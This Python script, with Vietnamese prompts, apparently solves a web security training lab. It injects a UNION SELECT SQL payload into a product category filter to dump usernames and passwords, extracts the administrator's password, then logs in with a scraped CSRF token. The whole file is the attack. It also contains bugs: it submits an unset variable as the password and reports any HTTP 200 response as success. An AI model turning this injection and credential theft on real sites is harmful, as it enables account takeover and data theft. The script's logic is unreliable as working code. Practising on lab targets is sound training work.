import requests
from bs4 import BeautifulSoup

print("Gửi URL dưới dạng: https://xxxxx.web-security-academy.net/")
url = input("Nhập URL: ").rstrip("/")

union_url = f"{url}/filter?category=Gifts'+UNION+SELECT+NULL,username||':'||password+FROM+users--"
print(f"Thử payload: {union_url}")

response = requests.get(union_url)

if response.status_code == 200:
    soup = BeautifulSoup(response.text, "html.parser")
    table_rows = soup.find_all("tr")

    password_found = None
    for row in table_rows:
        th = row.find("th")
        if th:
            content = th.text.strip()
            if content.startswith("administrator:"):
                password = content.split(":", 1)[1]
                break


    if password:
        print(f"Tìm thấy password của administrator: {password}")
    else:
        print("Không tìm thấy password")
        exit()
else:
    print("Lỗi")
    exit()

login_url = f"{url}/login"
session = requests.Session()
response = session.get(login_url)

soup = BeautifulSoup(response.text, "html.parser")
csrf_token = soup.find("input", {"name": "csrf"})["value"]

data = {
    "csrf": csrf_token,
    "username": "administrator",
    "password": password_found
}

response = session.post(login_url, data=data)

if "Welcome" in response.text or response.status_code == 200:
    print("Successful!")
else:
    print("Failed!")